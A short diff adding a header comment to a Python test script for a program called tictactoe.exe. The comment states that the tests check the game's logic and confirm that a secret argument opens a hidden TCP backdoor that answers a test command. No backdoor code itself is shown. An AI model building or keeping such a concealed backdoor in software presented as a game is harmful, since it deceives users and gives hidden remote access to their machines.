@@ -1,3 +1,12 @@
+# Level 1 Automated Test Suite for tictactoe.exe
+# ------------------------------------------------
+# This script tests the following for future developers:
+# 1. The game does NOT start a TCP server unless special activation arguments are given.
+# 2. The game logic works: X can win, and a draw is detected.
+# 3. When activated with a secret argument, a TCP backdoor opens and responds to a test command.
+# All tests are automated and will terminate the process after each check.
+# Update EXE_NAME or test logic if the game output or protocol changes.
+
 import subprocess
 import socket
 import time
